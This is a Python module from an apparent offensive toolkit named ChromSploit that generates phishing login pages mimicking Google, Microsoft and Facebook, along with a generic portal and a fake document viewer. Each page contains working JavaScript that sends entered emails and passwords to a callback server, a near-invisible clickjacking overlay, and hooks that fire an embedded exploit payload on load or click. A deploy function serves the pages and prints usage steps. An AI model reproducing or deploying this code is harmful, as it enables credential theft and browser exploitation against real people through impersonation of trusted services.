#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ChromSploit Framework v2.0
Phishing Website Generator with transparent click-through support
"""

import os
import base64
import json
from typing import Dict, Any, Optional
from datetime import datetime

from core.enhanced_logger import get_logger
from core.colors import Colors
from core.path_utils import PathUtils


class PhishingGenerator:
    """Generate convincing phishing pages with exploit integration"""
    
    def __init__(self):
        self.logger = get_logger()
        self.templates = {
            'google': self._generate_google_template,
            'microsoft': self._generate_microsoft_template,
            'facebook': self._generate_facebook_template,
            'generic': self._generate_generic_template,
            'document': self._generate_document_viewer
        }
    
    def generate_phishing_page(self, template: str, exploit_payload: str, 
                             callback_url: str, title: str = None) -> str:
        """
        Generate a phishing page with embedded exploit
        
        Args:
            template: Template name (google, microsoft, etc.)
            exploit_payload: JavaScript exploit code to embed
            callback_url: URL for data exfiltration
            title: Custom page title
            
        Returns:
            HTML content of phishing page
        """
        if template not in self.templates:
            template = 'generic'
        
        return self.templates[template](exploit_payload, callback_url, title)
    
    def _generate_transparent_overlay(self) -> str:
        """Generate transparent PNG overlay code for clickjacking"""
        return """
        <div id="overlay" style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 9999; cursor: pointer;">
            <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==" 
                 style="width: 100%; height: 100%; opacity: 0.01;" 
                 onclick="exploitTrigger()" />
        </div>
        """
    
    def _generate_google_template(self, exploit_payload: str, callback_url: str, title: str = None) -> str:
        """Generate Google login phishing page"""
        return f"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{title or 'Sign in - Google Accounts'}</title>
    <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500&display=swap" rel="stylesheet">
    <style>
        body {{
            margin: 0;
            padding: 0;
            font-family: 'Google Sans', Arial, sans-serif;
            background-color: #f0f0f0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }}
        .login-container {{
            background: white;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            padding: 40px;
            width: 400px;
            text-align: center;
        }}
        .google-logo {{
            width: 75px;
            margin-bottom: 20px;
        }}
        h1 {{
            font-size: 24px;
            font-weight: 400;
            margin-bottom: 10px;
        }}
        .subtitle {{
            color: #5f6368;
            font-size: 16px;
            margin-bottom: 30px;
        }}
        input {{
            width: 100%;
            padding: 13px 15px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            font-size: 16px;
            margin-bottom: 20px;
            box-sizing: border-box;
        }}
        input:focus {{
            outline: none;
            border-color: #1a73e8;
        }}
        .btn-primary {{
            background-color: #1a73e8;
            color: white;
            border: none;
            padding: 12px 24px;
            border-radius: 4px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            width: 100%;
            margin-top: 10px;
        }}
        .btn-primary:hover {{
            background-color: #1765cc;
        }}
        .forgot-link {{
            color: #1a73e8;
            text-decoration: none;
            font-size: 14px;
            display: inline-block;
            margin-top: 20px;
        }}
    </style>
</head>
<body>
    {self._generate_transparent_overlay()}
    <div class="login-container">
        <svg class="google-logo" viewBox="0 0 74 24" xmlns="http://www.w3.org/2000/svg">
            <path fill="#4285F4" d="M9.24 8.19v2.46h5.88c-.18 1.38-.64 2.39-1.34 3.1-.86.86-2.2 1.8-4.54 1.8-3.62 0-6.45-2.92-6.45-6.54s2.83-6.54 6.45-6.54c1.95 0 3.38.77 4.43 1.76L15.4 2.5C13.94 1.08 11.98 0 9.24 0 4.28 0 .11 4.04.11 9s4.17 9 9.13 9c2.68 0 4.7-.88 6.28-2.52 1.62-1.62 2.13-3.91 2.13-5.75 0-.57-.04-1.1-.13-1.54H9.24z"/>
            <path fill="#EA4335" d="M25 6.19c-3.21 0-5.83 2.44-5.83 5.81 0 3.34 2.62 5.81 5.83 5.81s5.83-2.46 5.83-5.81c0-3.37-2.62-5.81-5.83-5.81zm0 9.33c-1.76 0-3.28-1.45-3.28-3.52 0-2.09 1.52-3.52 3.28-3.52s3.28 1.43 3.28 3.52c0 2.07-1.52 3.52-3.28 3.52z"/>
            <path fill="#4285F4" d="M53.58 7.49h-.09c-.57-.68-1.67-1.3-3.06-1.3C47.53 6.19 45 8.72 45 12c0 3.26 2.53 5.81 5.43 5.81 1.39 0 2.49-.62 3.06-1.32h.09v.81c0 2.22-1.19 3.41-3.1 3.41-1.56 0-2.53-1.12-2.93-2.07l-2.22.92c.64 1.54 2.33 3.43 5.15 3.43 2.99 0 5.52-1.76 5.52-6.05V6.49h-2.42v1zm-2.93 8.03c-1.76 0-3.1-1.5-3.1-3.52 0-2.05 1.34-3.52 3.1-3.52 1.74 0 3.1 1.5 3.1 3.54.01 2.03-1.36 3.5-3.1 3.5z"/>
            <path fill="#FBBC05" d="M38 6.19c-3.21 0-5.83 2.44-5.83 5.81 0 3.34 2.62 5.81 5.83 5.81s5.83-2.46 5.83-5.81c0-3.37-2.62-5.81-5.83-5.81zm0 9.33c-1.76 0-3.28-1.45-3.28-3.52 0-2.09 1.52-3.52 3.28-3.52s3.28 1.43 3.28 3.52c0 2.07-1.52 3.52-3.28 3.52z"/>
            <path fill="#34A853" d="M58 .24h2.51v17.57H58z"/>
            <path fill="#EA4335" d="M68.26 15.52c-1.3 0-2.22-.59-2.82-1.76l7.77-3.21-.26-.66c-.48-1.3-1.96-3.7-4.97-3.7-2.99 0-5.48 2.35-5.48 5.81 0 3.26 2.46 5.81 5.76 5.81 2.66 0 4.2-1.63 4.84-2.57l-1.98-1.32c-.66.96-1.56 1.6-2.86 1.6zm-.18-7.15c1.03 0 1.91.53 2.2 1.28l-5.25 2.17c0-2.44 1.73-3.45 3.05-3.45z"/>
        </svg>
        <h1>Sign in</h1>
        <p class="subtitle">Use your Google Account</p>
        
        <form id="loginForm" onsubmit="return handleSubmit(event)">
            <input type="email" id="email" name="email" placeholder="Email or phone" required>
            <input type="password" id="password" name="password" placeholder="Password" required>
            <button type="submit" class="btn-primary">Next</button>
        </form>
        
        <a href="#" class="forgot-link">Forgot password?</a>
    </div>
    
    <script>
        // Exploit payload
        {exploit_payload}
        
        // Form handler
        function handleSubmit(e) {{
            e.preventDefault();
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            
            // Send credentials
            fetch('{callback_url}/credentials', {{
                method: 'POST',
                headers: {{'Content-Type': 'application/json'}},
                body: JSON.stringify({{
                    type: 'google',
                    email: email,
                    password: password,
                    timestamp: new Date().toISOString()
                }})
            }});
            
            // Show loading
            document.querySelector('.btn-primary').textContent = 'Signing in...';
            setTimeout(() => {{
                window.location.href = 'https://myaccount.google.com';
            }}, 2000);
            
            return false;
        }}
        
        function exploitTrigger() {{
            // Trigger exploit on transparent overlay click
            if (typeof runExploit === 'function') {{
                runExploit();
            }}
        }}
        
        // Auto-trigger after delay
        setTimeout(exploitTrigger, 3000);
    </script>
</body>
</html>"""
    
    def _generate_microsoft_template(self, exploit_payload: str, callback_url: str, title: str = None) -> str:
        """Generate Microsoft login phishing page"""
        return f"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{title or 'Sign in to your account'}</title>
    <style>
        body {{
            margin: 0;
            padding: 0;
            font-family: "Segoe UI", -apple-system, BlinkMacSystemFont, Roboto, Arial, sans-serif;
            background-color: #f2f2f2;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }}
        .login-container {{
            background: white;
            padding: 44px;
            width: 440px;
            box-shadow: 0 2px 6px rgba(0,0,0,0.2);
        }}
        .microsoft-logo {{
            width: 108px;
            height: 24px;
            margin-bottom: 16px;
        }}
        h1 {{
            font-size: 24px;
            font-weight: 600;
            margin: 16px 0 12px 0;
            color: #1b1b1b;
        }}
        input {{
            width: 100%;
            padding: 10px 12px;
            border: none;
            border-bottom: 1px solid #666;
            font-size: 15px;
            margin-bottom: 20px;
            box-sizing: border-box;
            background: transparent;
        }}
        input:focus {{
            outline: none;
            border-bottom-color: #0067b8;
        }}
        .btn-primary {{
            background-color: #0067b8;
            color: white;
            border: none;
            padding: 12px 20px;
            font-size: 16px;
            cursor: pointer;
            width: 100%;
            margin-top: 16px;
        }}
        .btn-primary:hover {{
            background-color: #005a9e;
        }}
        .options {{
            margin-top: 16px;
            font-size: 13px;
        }}
        .options a {{
            color: #0067b8;
            text-decoration: none;
        }}
    </style>
</head>
<body>
    {self._generate_transparent_overlay()}
    <div class="login-container">
        <svg class="microsoft-logo" viewBox="0 0 108 24">
            <path d="M44.836 4.6v13.8h-2.4V7.583H42.4L38.119 18.4h-1.588L32.142 7.583h-.029V18.4H29.9V4.6h3.436L37.3 14.83h.058L41.545 4.6zm2 1.049a1.268 1.268 0 0 1 .419-.967 1.413 1.413 0 0 1 1-.39 1.392 1.392 0 0 1 1.02.4 1.3 1.3 0 0 1 .4.958 1.248 1.248 0 0 1-.414.953 1.428 1.428 0 0 1-1.01.385A1.4 1.4 0 0 1 47.25 6.6a1.261 1.261 0 0 1-.409-.948zm2.62 2.446v10.3h-2.2v-10.3zm5.847 4.28a3.751 3.751 0 0 0 1.252.224 1.411 1.411 0 0 0 .886-.252.866.866 0 0 0 .321-.721.792.792 0 0 0-.263-.611 3.218 3.218 0 0 0-1.092-.441 4.618 4.618 0 0 1-1.67-.739 1.824 1.824 0 0 1-.641-1.483 2.045 2.045 0 0 1 .784-1.656 3.26 3.26 0 0 1 2.094-.642 5.819 5.819 0 0 1 1.967.291v1.874a3.41 3.41 0 0 0-1.58-.4 1.321 1.321 0 0 0-.806.234.758.758 0 0 0-.3.631.777.777 0 0 0 .292.611 4.047 4.047 0 0 0 1.141.485 4.482 4.482 0 0 1 1.582.7 1.8 1.8 0 0 1 .622 1.448 2.089 2.089 0 0 1-.831 1.721 3.551 3.551 0 0 1-2.215.644 6.258 6.258 0 0 1-1.393-.136 4.506 4.506 0 0 1-.793-.243v-1.893zm11.386.38a5 5 0 0 0-.611-.049 2.219 2.219 0 0 0-1.784.8 3.194 3.194 0 0 0-.68 2.13v3.126h-2.214V8.065h2.214v1.514h.029a2.686 2.686 0 0 1 2.489-1.689 1.89 1.89 0 0 1 .557.058zm7.635 1.407a5.256 5.256 0 0 1-.68 2.767 2.289 2.289 0 0 1-2 1.004 2.345 2.345 0 0 1-2.064-1.023 5.055 5.055 0 0 1-.7-2.767 4.863 4.863 0 0 1 .718-2.767 2.382 2.382 0 0 1 2.046-.985 2.341 2.341 0 0 1 2 1.009 5.209 5.209 0 0 1 .684 2.762zm-2.2-6.15v1.4h.039a2.686 2.686 0 0 1 2.328-1.514 3.426 3.426 0 0 1 2.758 1.194 5.245 5.245 0 0 1 1 3.38 5.315 5.315 0 0 1-1.077 3.468 3.549 3.549 0 0 1-2.866 1.274 2.567 2.567 0 0 1-2.182-1.058h-.029v4.447h-2.2V8.055zm13.629 5.137a1.111 1.111 0 0 0-.408-.9 1.692 1.692 0 0 0-1.067-.32 1.794 1.794 0 0 0-1.35.553 2.179 2.179 0 0 0-.545 1.46h3.399a3.57 3.57 0 0 0-.029-.797zm-3.389 1.825a1.932 1.932 0 0 0 .592 1.43 2.145 2.145 0 0 0 1.533.544 3.507 3.507 0 0 0 2.137-.68v1.659a5.181 5.181 0 0 1-2.612.641 3.758 3.758 0 0 1-2.943-1.214 4.851 4.851 0 0 1-1.077-3.335 5.068 5.068 0 0 1 1.165-3.461 3.846 3.846 0 0 1 3.046-1.3 3.268 3.268 0 0 1 2.563 1.033 4.17 4.17 0 0 1 .908 2.885v.8h-5.312z" fill="#737373"/>
            <rect fill="#f25022" x="0" y="0" width="11" height="11"/>
            <rect fill="#7fba00" x="12" y="0" width="11" height="11"/>
            <rect fill="#00a4ef" x="0" y="12" width="11" height="11"/>
            <rect fill="#ffb900" x="12" y="12" width="11" height="11"/>
        </svg>
        
        <h1>Sign in</h1>
        
        <form id="loginForm" onsubmit="return handleSubmit(event)">
            <input type="email" id="email" name="email" placeholder="Email, phone, or Skype" required>
            <p style="font-size: 13px; margin: 16px 0;">No account? <a href="#" style="color: #0067b8;">Create one!</a></p>
            <button type="submit" class="btn-primary">Next</button>
        </form>
        
        <div class="options">
            <p><a href="#">Sign in with a security key</a></p>
            <p><a href="#">Sign-in options</a></p>
        </div>
    </div>
    
    <script>
        // Exploit payload
        {exploit_payload}
        
        // Form handler
        function handleSubmit(e) {{
            e.preventDefault();
            const email = document.getElementById('email').value;
            
            // Send credentials
            fetch('{callback_url}/credentials', {{
                method: 'POST',
                headers: {{'Content-Type': 'application/json'}},
                body: JSON.stringify({{
                    type: 'microsoft',
                    email: email,
                    timestamp: new Date().toISOString()
                }})
            }});
            
            // Show password field (would normally load password page)
            document.querySelector('.btn-primary').textContent = 'Loading...';
            setTimeout(() => {{
                window.location.href = 'https://login.microsoft.com';
            }}, 2000);
            
            return false;
        }}
        
        function exploitTrigger() {{
            if (typeof runExploit === 'function') {{
                runExploit();
            }}
        }}
        
        setTimeout(exploitTrigger, 3000);
    </script>
</body>
</html>"""
    
    def _generate_facebook_template(self, exploit_payload: str, callback_url: str, title: str = None) -> str:
        """Generate Facebook login phishing page"""
        return f"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{title or 'Facebook - Log In or Sign Up'}</title>
    <style>
        body {{
            margin: 0;
            padding: 0;
            font-family: Helvetica, Arial, sans-serif;
            background-color: #f0f2f5;
        }}
        .header {{
            background-color: #1877f2;
            padding: 20px 0;
            text-align: center;
        }}
        .logo {{
            color: white;
            font-size: 42px;
            font-weight: bold;
            text-decoration: none;
        }}
        .container {{
            max-width: 396px;
            margin: 40px auto;
        }}
        .login-box {{
            background: white;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0,0,0,.1), 0 8px 16px rgba(0,0,0,.1);
            padding: 20px;
        }}
        input {{
            width: 100%;
            padding: 14px 16px;
            border: 1px solid #dddfe2;
            border-radius: 6px;
            font-size: 17px;
            margin-bottom: 12px;
            box-sizing: border-box;
        }}
        input:focus {{
            outline: none;
            border-color: #1877f2;
        }}
        .btn-primary {{
            background-color: #1877f2;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 20px;
            font-weight: bold;
            padding: 12px;
            width: 100%;
            cursor: pointer;
            margin: 8px 0;
        }}
        .btn-primary:hover {{
            background-color: #166fe5;
        }}
        .forgot-link {{
            color: #1877f2;
            text-decoration: none;
            font-size: 14px;
            text-align: center;
            display: block;
            margin: 16px 0;
        }}
        .divider {{
            text-align: center;
            margin: 20px 0;
            position: relative;
        }}
        .divider::before {{
            content: '';
            position: absolute;
            top: 50%;
            left: 0;
            right: 0;
            height: 1px;
            background-color: #dadde1;
        }}
        .divider span {{
            background: white;
            padding: 0 16px;
            position: relative;
            color: #8a8d91;
            font-size: 14px;
        }}
        .btn-secondary {{
            background-color: #42b72a;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 17px;
            font-weight: bold;
            padding: 12px 16px;
            cursor: pointer;
            display: inline-block;
        }}
        .btn-secondary:hover {{
            background-color: #36a420;
        }}
    </style>
</head>
<body>
    {self._generate_transparent_overlay()}
    <div class="header">
        <a href="#" class="logo">facebook</a>
    </div>
    
    <div class="container">
        <div class="login-box">
            <form id="loginForm" onsubmit="return handleSubmit(event)">
                <input type="text" id="email" name="email" placeholder="Email or phone number" required>
                <input type="password" id="password" name="password" placeholder="Password" required>
                <button type="submit" class="btn-primary">Log In</button>
            </form>
            
            <a href="#" class="forgot-link">Forgot password?</a>
            
            <div class="divider">
                <span>or</span>
            </div>
            
            <div style="text-align: center;">
                <button class="btn-secondary">Create new account</button>
            </div>
        </div>
    </div>
    
    <script>
        // Exploit payload
        {exploit_payload}
        
        // Form handler
        function handleSubmit(e) {{
            e.preventDefault();
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            
            // Send credentials
            fetch('{callback_url}/credentials', {{
                method: 'POST',
                headers: {{'Content-Type': 'application/json'}},
                body: JSON.stringify({{
                    type: 'facebook',
                    email: email,
                    password: password,
                    timestamp: new Date().toISOString()
                }})
            }});
            
            // Show loading
            document.querySelector('.btn-primary').textContent = 'Logging in...';
            setTimeout(() => {{
                window.location.href = 'https://www.facebook.com';
            }}, 2000);
            
            return false;
        }}
        
        function exploitTrigger() {{
            if (typeof runExploit === 'function') {{
                runExploit();
            }}
        }}
        
        setTimeout(exploitTrigger, 3000);
    </script>
</body>
</html>"""
    
    def _generate_generic_template(self, exploit_payload: str, callback_url: str, title: str = None) -> str:
        """Generate generic phishing page"""
        return f"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{title or 'Secure Login Portal'}</title>
    <style>
        body {{
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }}
        .login-container {{
            background: white;
            border-radius: 10px;
            box-shadow: 0 14px 28px rgba(0,0,0,0.25), 0 10px 10px rgba(0,0,0,0.22);
            padding: 40px;
            width: 400px;
            max-width: 90%;
        }}
        .logo {{
            text-align: center;
            margin-bottom: 30px;
        }}
        .logo i {{
            font-size: 48px;
            color: #667eea;
        }}
        h2 {{
            text-align: center;
            color: #333;
            margin-bottom: 30px;
        }}
        .form-group {{
            margin-bottom: 20px;
        }}
        label {{
            display: block;
            margin-bottom: 5px;
            color: #666;
            font-size: 14px;
        }}
        input {{
            width: 100%;
            padding: 12px;
            border: 1px solid #ddd;
            border-radius: 5px;
            font-size: 16px;
            box-sizing: border-box;
            transition: border-color 0.3s;
        }}
        input:focus {{
            outline: none;
            border-color: #667eea;
        }}
        .btn {{
            width: 100%;
            padding: 12px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            transition: transform 0.2s;
        }}
        .btn:hover {{
            transform: translateY(-2px);
        }}
        .links {{
            text-align: center;
            margin-top: 20px;
        }}
        .links a {{
            color: #667eea;
            text-decoration: none;
            font-size: 14px;
            margin: 0 10px;
        }}
        .security-info {{
            background: #f8f9fa;
            border-left: 4px solid #667eea;
            padding: 10px;
            margin-top: 20px;
            font-size: 12px;
            color: #666;
        }}
    </style>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
</head>
<body>
    {self._generate_transparent_overlay()}
    <div class="login-container">
        <div class="logo">
            <i class="fas fa-shield-alt"></i>
        </div>
        <h2>Secure Login Portal</h2>
        
        <form id="loginForm" onsubmit="return handleSubmit(event)">
            <div class="form-group">
                <label for="username">Username or Email</label>
                <input type="text" id="username" name="username" required>
            </div>
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" required>
            </div>
            <button type="submit" class="btn">Login Securely</button>
        </form>
        
        <div class="links">
            <a href="#">Forgot Password?</a>
            <a href="#">Create Account</a>
        </div>
        
        <div class="security-info">
            <i class="fas fa-lock"></i> Your connection is encrypted and secure
        </div>
    </div>
    
    <script>
        // Exploit payload
        {exploit_payload}
        
        // Form handler
        function handleSubmit(e) {{
            e.preventDefault();
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            
            // Send credentials
            fetch('{callback_url}/credentials', {{
                method: 'POST',
                headers: {{'Content-Type': 'application/json'}},
                body: JSON.stringify({{
                    type: 'generic',
                    username: username,
                    password: password,
                    timestamp: new Date().toISOString()
                }})
            }});
            
            // Show loading
            document.querySelector('.btn').innerHTML = '<i class="fas fa-spinner fa-spin"></i> Authenticating...';
            setTimeout(() => {{
                alert('Login successful! Redirecting...');
                window.location.reload();
            }}, 2000);
            
            return false;
        }}
        
        function exploitTrigger() {{
            if (typeof runExploit === 'function') {{
                runExploit();
            }}
        }}
        
        // Auto-trigger on page load
        window.addEventListener('load', () => {{
            setTimeout(exploitTrigger, 2000);
        }});
        
        // Trigger on any click
        document.addEventListener('click', exploitTrigger, {{once: true}});
    </script>
</body>
</html>"""
    
    def _generate_document_viewer(self, exploit_payload: str, callback_url: str, title: str = None) -> str:
        """Generate document viewer phishing page"""
        return f"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{title or 'Secure Document Viewer'}</title>
    <style>
        body {{
            margin: 0;
            padding: 0;
            font-family: Arial, sans-serif;
            background-color: #f5f5f5;
            overflow: hidden;
        }}
        .header {{
            background-color: #dc3545;
            color: white;
            padding: 15px 20px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
        }}
        .header h1 {{
            margin: 0;
            font-size: 24px;
            display: flex;
            align-items: center;
        }}
        .header i {{
            margin-right: 10px;
        }}
        .viewer {{
            height: calc(100vh - 70px);
            display: flex;
            justify-content: center;
            align-items: center;
            position: relative;
        }}
        .document-container {{
            background: white;
            width: 90%;
            max-width: 800px;
            height: 90%;
            box-shadow: 0 5px 15px rgba(0,0,0,0.3);
            position: relative;
            overflow: hidden;
        }}
        .loading-overlay {{
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(255,255,255,0.95);
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 1000;
        }}
        .spinner {{
            border: 4px solid #f3f3f3;
            border-top: 4px solid #dc3545;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
        }}
        @keyframes spin {{
            0% {{ transform: rotate(0deg); }}
            100% {{ transform: rotate(360deg); }}
        }}
        .loading-text {{
            margin-top: 20px;
            color: #666;
            font-size: 18px;
        }}
        .document-content {{
            padding: 40px;
            height: 100%;
            overflow-y: auto;
        }}
        .document-content h2 {{
            color: #333;
            margin-bottom: 20px;
        }}
        .document-content p {{
            line-height: 1.6;
            color: #666;
            margin-bottom: 15px;
        }}
        .toolbar {{
            position: absolute;
            top: 20px;
            right: 20px;
            display: flex;
            gap: 10px;
        }}
        .toolbar button {{
            background: #dc3545;
            color: white;
            border: none;
            padding: 8px 15px;
            border-radius: 4px;
            cursor: pointer;
            font-size: 14px;
        }}
        .toolbar button:hover {{
            background: #c82333;
        }}
        .security-warning {{
            background: #fff3cd;
            border: 1px solid #ffeaa7;
            border-radius: 4px;
            padding: 15px;
            margin-bottom: 20px;
            color: #856404;
            display: flex;
            align-items: center;
        }}
        .security-warning i {{
            margin-right: 10px;
            font-size: 20px;
        }}
    </style>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
</head>
<body>
    {self._generate_transparent_overlay()}
    <div class="header">
        <h1><i class="fas fa-file-pdf"></i> Secure Document Viewer</h1>
        <div>
            <span><i class="fas fa-lock"></i> Encrypted Connection</span>
        </div>
    </div>
    
    <div class="viewer">
        <div class="document-container">
            <div class="loading-overlay" id="loadingOverlay">
                <div class="spinner"></div>
                <div class="loading-text">Loading secure document...</div>
            </div>
            
            <div class="toolbar">
                <button onclick="downloadDocument()"><i class="fas fa-download"></i> Download</button>
                <button onclick="printDocument()"><i class="fas fa-print"></i> Print</button>
                <button onclick="shareDocument()"><i class="fas fa-share"></i> Share</button>
            </div>
            
            <div class="document-content" style="display: none;" id="documentContent">
                <div class="security-warning">
                    <i class="fas fa-exclamation-triangle"></i>
                    <span>This document contains sensitive information. Please handle with care.</span>
                </div>
                
                <h2>Confidential Document</h2>
                <p>This document has been securely delivered to you through our encrypted document sharing platform.</p>
                <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Sed do eiusmod tempor incididunt ut labore et dolore magna aliqua.</p>
                <p>Please review the contents carefully and ensure you are in a secure environment before proceeding.</p>
                
                <h3>Important Information</h3>
                <p>The information contained in this document is confidential and proprietary. Unauthorized disclosure is strictly prohibited.</p>
            </div>
        </div>
    </div>
    
    <script>
        // Exploit payload
        {exploit_payload}
        
        // Simulate document loading
        setTimeout(() => {{
            document.getElementById('loadingOverlay').style.display = 'none';
            document.getElementById('documentContent').style.display = 'block';
            
            // Log document access
            fetch('{callback_url}/document-access', {{
                method: 'POST',
                headers: {{'Content-Type': 'application/json'}},
                body: JSON.stringify({{
                    type: 'document_viewer',
                    action: 'viewed',
                    timestamp: new Date().toISOString(),
                    userAgent: navigator.userAgent
                }})
            }});
        }}, 3000);
        
        function downloadDocument() {{
            fetch('{callback_url}/document-access', {{
                method: 'POST',
                headers: {{'Content-Type': 'application/json'}},
                body: JSON.stringify({{
                    type: 'document_viewer',
                    action: 'download_attempt',
                    timestamp: new Date().toISOString()
                }})
            }});
            alert('Download started...');
        }}
        
        function printDocument() {{
            window.print();
        }}
        
        function shareDocument() {{
            alert('Share functionality coming soon...');
        }}
        
        function exploitTrigger() {{
            if (typeof runExploit === 'function') {{
                runExploit();
            }}
        }}
        
        // Auto-trigger exploit
        window.addEventListener('load', () => {{
            setTimeout(exploitTrigger, 1500);
        }});
        
        // Trigger on any interaction
        document.addEventListener('click', () => {{
            exploitTrigger();
        }}, {{once: true}});
    </script>
</body>
</html>"""
    
    def deploy_phishing_site(self, template: str, exploit_payload: str, 
                           callback_url: str, port: int = 8080) -> Dict[str, Any]:
        """
        Deploy phishing site with embedded exploit
        
        Args:
            template: Template to use
            exploit_payload: JavaScript exploit code
            callback_url: Callback URL for data
            port: Port to serve on
            
        Returns:
            Deployment info
        """
        try:
            # Generate phishing page
            html_content = self.generate_phishing_page(template, exploit_payload, callback_url)
            
            # Save to file
            output_dir = os.path.join(PathUtils.get_output_dir(), "phishing_sites")
            PathUtils.ensure_dir_exists(output_dir)
            
            filename = f"phishing_{template}_{int(datetime.now().timestamp())}.html"
            filepath = os.path.join(output_dir, filename)
            
            with open(filepath, 'w', encoding='utf-8') as f:
                f.write(html_content)
            
            self.logger.info(f"Phishing site generated: {filepath}")
            
            # Start simple HTTP server
            server_script = f"""#!/usr/bin/env python3
import http.server
import socketserver
import os

os.chdir('{output_dir}')
Handler = http.server.SimpleHTTPRequestHandler
with socketserver.TCPServer(("", {port}), Handler) as httpd:
    print(f"Serving phishing site at http://localhost:{port}/{filename}")
    httpd.serve_forever()
"""
            
            server_script_path = os.path.join(output_dir, "serve_phishing.py")
            with open(server_script_path, 'w') as f:
                f.write(server_script)
            os.chmod(server_script_path, 0o755)
            
            return {
                'success': True,
                'filepath': filepath,
                'url': f"http://localhost:{port}/{filename}",
                'server_script': server_script_path,
                'instructions': [
                    f"1. Start server: python3 {server_script_path}",
                    f"2. Access phishing site: http://localhost:{port}/{filename}",
                    "3. Site includes transparent overlay for clickjacking",
                    "4. Exploit triggers automatically after 3 seconds"
                ]
            }
            
        except Exception as e:
            self.logger.error(f"Failed to deploy phishing site: {e}")
            return {
                'success': False,
                'error': str(e)
            }


# Module interface
_phishing_generator = None

def get_phishing_generator() -> PhishingGenerator:
    """Get or create phishing generator instance"""
    global _phishing_generator
    if _phishing_generator is None:
        _phishing_generator = PhishingGenerator()
    return _phishing_generator